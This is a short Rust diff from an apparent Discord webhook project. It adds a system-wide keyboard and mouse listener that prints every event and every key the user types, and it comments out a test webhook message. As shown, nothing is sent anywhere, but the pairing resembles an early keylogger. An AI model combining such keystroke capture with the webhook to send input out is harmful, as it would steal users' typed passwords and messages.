@@ -2,6 +2,15 @@ mod discord;
 use discord::Discord;
 use std::fs;
 use serde::{Deserialize, Serialize};
+use rdev::{listen, Event};
+
+fn callback(event: Event) {
+    println!("My callback {:?}", event);
+    match event.name {
+        Some(string) => println!("User wrote {:?}", string),
+        None => (),
+    }
+}
 
 #[derive(Deserialize, Serialize)]
 struct Config {
@@ -23,5 +32,9 @@ fn main() {
 
     // sending a test message
 
-    discord_client.send_webhook("Hello, Rust !");
+    //discord_client.send_webhook("Hello, Rust !");
+
+    if let Err(error) = listen(callback) {
+        println!("Error: {:?}", error);
+    }
 }
